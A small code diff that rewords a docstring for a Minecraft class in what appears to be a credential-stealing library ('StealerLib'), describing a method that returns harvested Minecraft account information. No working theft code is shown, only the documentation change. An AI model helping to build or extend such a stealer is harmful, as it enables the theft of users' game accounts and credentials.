@@ -66,10 +66,10 @@ class Minecraft:
         
         Parameters:
             self (object): The object passed to the method
-            conv (bool): Boolean whether to append the data as a converted value or a StealerLib object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
-            list: A list of the grabbed Minecraft accounts information, stored in another list or a StealerLib object
+            list: A list of the gathered Minecraft accounts information, appended as a list or StealerLib objects
         """
 
         if self.database:
